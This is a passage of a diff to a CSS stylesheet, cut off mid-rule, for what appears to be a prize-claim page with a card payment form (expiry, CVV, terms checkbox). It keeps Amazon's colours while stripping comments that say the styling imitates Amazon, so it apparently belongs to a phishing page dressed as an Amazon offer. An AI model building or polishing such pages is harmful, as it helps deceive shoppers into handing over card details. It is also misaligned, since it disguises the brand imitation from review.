@@ -63,10 +63,12 @@ h1 {
 
 .prize-section, .form-section, .sidebar, .success-section {
     width: 100%;
+    max-width: 600px; /* Reduced for better alignment and centering */
     background: white;
     padding: 20px;
     border-radius: 8px;
     box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+    margin: 0 auto; /* Ensure centering */
 }
 
 h2, h3 {
@@ -112,7 +114,7 @@ h2, h3 {
 }
 
 .form-section fieldset {
-    border: none; /* Remove border for more Amazon-like look */
+    border: none;
     padding: 0;
     margin-bottom: 30px;
 }
@@ -150,7 +152,7 @@ label {
 input {
     width: 100%;
     padding: 12px;
-    border: 1px solid #888C8C; /* Amazon's input border color */
+    border: 1px solid #888C8C;
     border-radius: 3px;
     font-size: 14px;
     box-sizing: border-box;
@@ -159,7 +161,7 @@ input {
 }
 
 input:focus {
-    border-color: #E47911; /* Amazon orange focus */
+    border-color: #E47911;
     box-shadow: 0 0 0 3px rgba(228,121,17,0.5);
 }
 
@@ -171,7 +173,7 @@ input:focus {
 }
 
 .card-icons::before {
-    content: "💳 "; /* Simple card icon */
+    content: "💳 ";
 }
 
 .payment-group {
@@ -180,10 +182,43 @@ input:focus {
     gap: 20px;
 }
 
-.exp-cvv {
+.exp-group {
     display: flex;
     flex-direction: column;
     gap: 20px;
 }
 
-.exp-cvv >
+.exp-fields {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.exp-fields input {
+    flex: 1;
+    min-width: 0;
+}
+
+.exp-fields span {
+    font-size: 18px;
+    color: #111;
+}
+
+.cvv-hint {
+    font-size: 12px;
+    color: #565959;
+    margin-top: 5px;
+    text-align: right;
+}
+
+.terms {
+    margin: 20px 0;
+    font-size: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+}
+
+.terms input {
+    width: auto;
+   
